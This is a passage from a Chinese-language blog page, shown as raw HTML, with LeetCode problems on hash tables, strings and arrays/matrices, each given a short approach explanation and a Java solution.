</span>&#123;</span><br><span class="line">        Set&lt;Integer&gt; res=<span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.size()==nums.length?<span class="keyword">false</span>:<span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-最长和谐序列"><a class="markdownIt-Anchor" href="#3-最长和谐序列"></a> 3. 最长和谐序列</h3><p>  <a href="https://leetcode-cn.com/problems/longest-harmonious-subsequence/">https://leetcode-cn.com/problems/longest-harmonious-subsequence/</a></p><h4 id="思路-124"><a class="markdownIt-Anchor" href="#思路-124"></a> 思路</h4><p>  先遍历一遍数组，用HashMap保存各个数字的出现频率，然后再遍历一次，获取相邻两数的频次和，找最大值。</p><h4 id="代码-122"><a class="markdownIt-Anchor" href="#代码-122"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLHS</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; res=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.put(nums[i],res.getOrDefault(nums[i],<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> keys : res.keySet())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(res.containsKey(keys+<span class="number">1</span>))</span><br><span class="line">                max=Math.max(max,res.get(keys)+res.get(keys+<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-最长连续序列"><a class="markdownIt-Anchor" href="#4-最长连续序列"></a> 4. 最长连续序列</h3><p>  <a href="https://leetcode-cn.com/problems/longest-consecutive-sequence/">https://leetcode-cn.com/problems/longest-consecutive-sequence/</a></p><h4 id="思路-125"><a class="markdownIt-Anchor" href="#思路-125"></a> 思路</h4><p>  对于O(n)的复杂度，我们遍历一次数组，然后用辅助的Hash表进行存储，对于任意遍历到的元素，会有两种情况：</p><ol><li>表中已经存在，因为题目要求的序列元素是不重复的，所以无需处理。</li><li>表中不存在当前元素，需要查找该元素左右相邻数的最长连续区间长度，然后现在的最长连续区间长度就是left+right+1，随后更新两边端点的长度值以及要求的最大值即可。</li></ol><h4 id="代码-123"><a class="markdownIt-Anchor" href="#代码-123"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;Integer,Integer&gt; len=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!len.containsKey(num))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> left=len.getOrDefault(num-<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">int</span> right=len.getOrDefault(num+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">int</span> curlength=left+right+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(res&lt;curlength)</span><br><span class="line">                    res=curlength;</span><br><span class="line">                len.put(num-left,curlength);</span><br><span class="line">                len.put(num+right,curlength);</span><br><span class="line">                len.put(num,curlength);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五-字符串"><a class="markdownIt-Anchor" href="#五-字符串"></a> 五、字符串</h2><h3 id="1-两个字符串包含的字符是否完全相同"><a class="markdownIt-Anchor" href="#1-两个字符串包含的字符是否完全相同"></a> 1. 两个字符串包含的字符是否完全相同</h3><p>  <a href="https://leetcode-cn.com/problems/valid-anagram">https://leetcode-cn.com/problems/valid-anagram</a></p><h4 id="思路-126"><a class="markdownIt-Anchor" href="#思路-126"></a> 思路</h4><p>  用一个字符数组，遍历两个字符串，统计各数字出现的频次，如果频次对不上则false。</p><h4 id="代码-124"><a class="markdownIt-Anchor" href="#代码-124"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAnagram</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] dic=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dic[s.charAt(i)-<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dic[t.charAt(i)-<span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">            <span class="keyword">if</span>(dic[i]!=<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-计算一组字符集合可以组成的回文字符串的最大长度"><a class="markdownIt-Anchor" href="#2-计算一组字符集合可以组成的回文字符串的最大长度"></a> 2. 计算一组字符集合可以组成的回文字符串的最大长度</h3><p>  <a href="https://leetcode-cn.com/problems/longest-palindrome">https://leetcode-cn.com/problems/longest-palindrome</a></p><h4 id="思路-127"><a class="markdownIt-Anchor" href="#思路-127"></a> 思路</h4><p>  遍历一次字符串统计各字符个数，偶数个的直接加，奇数个的-1再加，并且在最后加上一个多余的奇数个字符放在最中间。</p><h4 id="代码-125"><a class="markdownIt-Anchor" href="#代码-125"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] dic=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>*<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> ch=s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(ch&lt;<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                dic[ch-<span class="string">&#x27;A&#x27;</span>]++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dic[ch-<span class="string">&#x27;a&#x27;</span>+<span class="number">26</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> hassingle=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dic.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(dic[i]%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;dic[i]!=<span class="number">0</span>)</span><br><span class="line">                res+=dic[i];</span><br><span class="line">            <span class="keyword">if</span>(dic[i]%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                hassingle=<span class="number">1</span>;</span><br><span class="line">                res+=dic[i]-<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res+hassingle;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-字符串同构"><a class="markdownIt-Anchor" href="#3-字符串同构"></a> 3. 字符串同构</h3><p>  <a href="https://leetcode-cn.com/problems/isomorphic-strings/">https://leetcode-cn.com/problems/isomorphic-strings/</a></p><h4 id="思路-128"><a class="markdownIt-Anchor" href="#思路-128"></a> 思路</h4><p>  对于每个字符记录其上一次出现的位置，然后对比两个字符串位置是否一样，不一样就false。<br />  但是保存的时候位置要+1，不然就和0重复了。</p><h4 id="代码-126"><a class="markdownIt-Anchor" href="#代码-126"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isIsomorphic</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] sdic=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">128</span>];</span><br><span class="line">        <span class="keyword">int</span>[] tdic=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">128</span>];</span><br><span class="line">        <span class="keyword">if</span>(s.length()!=t.length())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> sc=s.charAt(i);</span><br><span class="line">            <span class="keyword">char</span> tc=t.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(sdic[sc]!=tdic[tc])</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            sdic[sc]=i+<span class="number">1</span>;</span><br><span class="line">            tdic[tc]=i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-回文子字符串个数"><a class="markdownIt-Anchor" href="#4-回文子字符串个数"></a> 4. 回文子字符串个数</h3><p>  <a href="https://leetcode-cn.com/problems/palindromic-substrings/">https://leetcode-cn.com/problems/palindromic-substrings/</a></p><h4 id="思路-129"><a class="markdownIt-Anchor" href="#思路-129"></a> 思路</h4><p>  遍历字符串，从每个字符开始尝试向两边扩展。</p><h4 id="代码-127"><a class="markdownIt-Anchor" href="#代码-127"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countSubstrings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sup(s,i,i);</span><br><span class="line">            sup(s,i,i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sup</span><span class="params">(String s,<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start&gt;=<span class="number">0</span>&amp;&amp;end&lt;s.length()&amp;&amp;s.charAt(start)==s.charAt(end))</span><br><span class="line">        &#123;</span><br><span class="line">            start--;</span><br><span class="line">            end++;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-判断一个整数是否是回文数"><a class="markdownIt-Anchor" href="#5-判断一个整数是否是回文数"></a> 5. 判断一个整数是否是回文数</h3><p>  <a href="https://leetcode-cn.com/problems/palindrome-number/">https://leetcode-cn.com/problems/palindrome-number/</a></p><h4 id="思路-130"><a class="markdownIt-Anchor" href="#思路-130"></a> 思路</h4><p>  为了不使用字符串，我们可以取出数字的后半段然后反转进行比较。<br />  我们将数字/10取出1位，然后*10再加下一位，这样就可以把数字的尾部反转，直到反转数&gt;=剩余数，说明已经到达中点或者已经过了中点，此时对两部分数字进行比较即可。<br />  如果是回文数，比较时会有两种情况：</p><ol><li>两侧正好相等。</li><li>因为原数是的位数是奇数，所有反转数会比剩余数多一位，此时只要/10然后比较即可。</li></ol><h4 id="代码-128"><a class="markdownIt-Anchor" href="#代码-128"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>||x%<span class="number">10</span>==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> left=x;</span><br><span class="line">        <span class="keyword">int</span> right=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right&lt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            right=right*<span class="number">10</span>+left%<span class="number">10</span>;</span><br><span class="line">            left/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left==right||left==right/<span class="number">10</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-统计二进制字符串中连续-1-和连续-0-数量相同的子字符串个数"><a class="markdownIt-Anchor" href="#6-统计二进制字符串中连续-1-和连续-0-数量相同的子字符串个数"></a> 6. 统计二进制字符串中连续 1 和连续 0 数量相同的子字符串个数</h3><p>  <a href="https://leetcode-cn.com/problems/count-binary-substrings/">https://leetcode-cn.com/problems/count-binary-substrings/</a></p><h4 id="思路-131"><a class="markdownIt-Anchor" href="#思路-131"></a> 思路</h4><p>  遍历保存当前连续的0或1的个数为precount，然后遍历紧邻的相反数字的个数为curcount，那么只要precount&gt;=curcount，那么curcount每增加1，回文子串就会增加1,这样遍历下来，就会获得回文子串的数量，当数字反转时，重置状态。</p><h4 id="代码-129"><a class="markdownIt-Anchor" href="#代码-129"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countBinarySubstrings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> curcount=<span class="number">1</span>,precount=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i)==s.charAt(i-<span class="number">1</span>))</span><br><span class="line">                curcount++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                precount=curcount;</span><br><span class="line">                curcount=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(curcount&lt;=precount)</span><br><span class="line">                res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六-数组与矩阵"><a class="markdownIt-Anchor" href="#六-数组与矩阵"></a> 六、数组与矩阵</h2><h3 id="1-把数组中的-0-移到末尾"><a class="markdownIt-Anchor" href="#1-把数组中的-0-移到末尾"></a> 1. 把数组中的 0 移到末尾</h3><p>  <a href="https://leetcode-cn.com/problems/move-zeroes/">https://leetcode-cn.com/problems/move-zeroes/</a></p><h4 id="思路-132"><a class="markdownIt-Anchor" href="#思路-132"></a> 思路</h4><p>  简单位移，剩余部分填充0。</p><h4 id="代码-130"><a class="markdownIt-Anchor" href="#代码-130"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]!=<span class="number">0</span>)</span><br><span class="line">                nums[index++]=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=index;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            nums[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-改变矩阵维度"><a class="markdownIt-Anchor" href="#2-改变矩阵维度"></a> 2. 改变矩阵维度</h3><p>  <a href="https://leetcode-cn.com/problems/reshape-the-matrix/">https://leetcode-cn.com/problems/reshape-the-matrix/</a></p><h4 id="思路-133"><a class="markdownIt-Anchor" href="#思路-133"></a> 思路</h4><p>  手动控制目标数组进位。</p><h4 id="代码-131"><a class="markdownIt-Anchor" href="#代码-131"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] matrixReshape(<span class="keyword">int</span>[][] nums, <span class="keyword">int</span> r, <span class="keyword">int</span> c) &#123;</span><br><span class="line">        <span class="keyword">int</span>[][] res=<span class="keyword">new</span> <span class="keyword">int</span>[r][c];</span><br><span class="line">        <span class="keyword">int</span> row=<span class="number">0</span>,col=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(r*c!=nums.length*nums[<span class="number">0</span>].length)</span><br><span class="line">            <span class="keyword">return</span> nums;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums[<span class="number">0</span>].length;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                res[row][col++]=nums[i][j];</span><br><span class="line">                <span class="keyword">if</span>(col==c)</span><br><span class="line">                &#123;</span><br><span class="line">                    row++;</span><br><span class="line">                    col=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-找出数组中最长的连续-1"><a class="markdownIt-Anchor" href="#3-找出数组中最长的连续-1"></a> 3. 找出数组中最长的连续 1</h3><p>  <a href="https://leetcode-cn.com/problems/max-consecutive-ones/">https://leetcode-cn.com/problems/max-consecutive-ones/</a></p><h4 id="思路-134"><a class="markdownIt-Anchor" href="#思路-134"></a> 思路</h4><p>  单次遍历查找连续的1。</p><h4 id="代码-132"><a class="markdownIt-Anchor" href="#代码-132"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMaxConsecutiveOnes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> curcount=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==<span class="number">1</span>)</span><br><span class="line">                curcount++;</span><br><span class="line">            <span class="keyword">if</span>(curcount&gt;max)</span><br><span class="line">                max=curcount;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]!=<span class="number">1</span>)</span><br><span class="line">                curcount=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-有序矩阵查找"><a class="markdownIt-Anchor" href="#4-有序矩阵查找"></a> 4. 有序矩阵查找</h3><p>  <a href="https://leetcode-cn.com/problems/search-a-2d-matrix-ii/">https://leetcode-cn.com/problems/search-a-2d-matrix-ii/</a></p><h4 id="思路-135"><a class="markdownIt-Anchor" href="#思路-135"></a> 思路</h4><p>  左下角的元素是这一行中最小的元素，同时又是这一列中最大的元素。比较左下角元素和目标：</p><ol><li>若左下角元素等于目标，则找到</li><li>若左下角元素大于目标，则目标不可能存在于当前矩阵的最后一行，问题规模可以减小为在去掉最后一行的子矩阵中寻找目标</li><li>若左下角元素小于目标，则目标不可能存在于当前矩阵的第一列，问题规模可以减小为在去掉第一列的子矩阵中寻找目标</li><li>若最后矩阵减小为空，则说明不存在</li></ol><h4 id="代码-133"><a class="markdownIt-Anchor" href="#代码-133"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">searchMatrix</span><span class="params">(<span class="keyword">int</span>[][] matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(matrix==<span class="keyword">null</span>||matrix.length==<span class="number">0</span>||matrix[<span class="number">0</span>].length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> m=matrix.length;</span><br><span class="line">        <span class="keyword">int</span> n=matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=n-<span class="number">1</span>;i&lt;m&amp;&amp;j&gt;=<span class="number">0</span>;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(target==matrix[i][j])</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(target&lt;matrix[i][j])</span><br><span class="line">                j--;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-有序矩阵的-kth-element"><a class="markdownIt-Anchor" href="#5-有序矩阵的-kth-element"></a> 5. 有序矩阵的 Kth Element</h3><p>  <a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-sorted-matrix/">https://leetcode-cn.com/problems/kth-smallest-element-in-a-sorted-matrix/</a></p><h4 id="思路-136"><a class="markdownIt-Anchor" href="#思路-136"></a> 思路</h4><p>  没看懂二分，很尴尬，用K个指针实现了最笨的版本，执行用时:73 ms, 在所有 Java 提交中击败了14.78%的用户。</p><h4 id="代码-134"><a class="markdownIt-Anchor" href="#代码-134"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(<span class="keyword">int</span>[][] matrix, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] p=<span class="keyword">new</span> <span class="keyword">int</span>[matrix.length];</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> curcol=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> min=Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;matrix.length;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(p[i]&gt;=matrix[<span class="number">0</span>].length)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(min&gt;matrix[i][p[i]])</span><br><span class="line">                &#123;</span><br><span class="line">                    min=matrix[i][p[i]];</span><br><span class="line">                    curcol=i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">if</span>(count==k)</span><br><span class="line">                <span class="keyword">return</span> min;</span><br><span class="line">            p[curcol]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-一个数组元素在-1-n-之间其中一个数被替换为另一个数找出重复的数和丢失的数"><a class="markdownIt-Anchor" href="#6-一个数组元素在-1-n-之间其中一个数被替换为另一个数找出重复的数和丢失的数"></a> 6. 一个数组元素在 [1, n] 之间，其中一个数被替换为另一个数，找出重复的数和丢失的数</h3><p>  <a href="https://leetcode-cn.com/problems/set-mismatch/">https://leetcode-cn.com/problems/set-mismatch/</a></p><h4 id="思路-137"><a class="markdownIt-Anchor" href="#思路-137"></a> 思路</h4><p>  遍历一次并替换，将当前元素与应该在的正确位置的元素进行替换，结束替换应该有两个条件。</p><ol><li>当前元素位置正确，向下一位移动。</li><li>当前元素与目标位置元素相同，向下一位移动，否则会死循环。</li></ol><h4 id="代码-135"><a class="markdownIt-Anchor" href="#代码-135"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] findErrorNums(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (nums[i] != i + <span class="number">1</span> &amp;&amp; nums[nums[i] - <span class="number">1</span>] != nums[i]) &#123;</span><br><span class="line">            swap(nums, i, nums[i] - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] != i + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;nums[i], i + <span class="number">1</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = nums[i];</span><br><span class="line">    nums[i] = nums[j];</span><br><span class="line">    nums[j] = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-找出数组中重复的数数组值在-1-n-之间"><a class="markdownIt-Anchor" href="#7-找出数组中重复的数数组值在-1-n-之间"></a> 7. 找出数组中重复的数，数组值在 [1, n] 之间</h3><p>  <a href="https://leetcode-cn.com/problems/find-the-duplicate-number/">https://leetcode-cn.com/problems/find-the-duplicate-number/</a></p><h4 id="思路-138"><a class="markdownIt-Anchor" href="#思路-138"></a> 思路</h4><p>  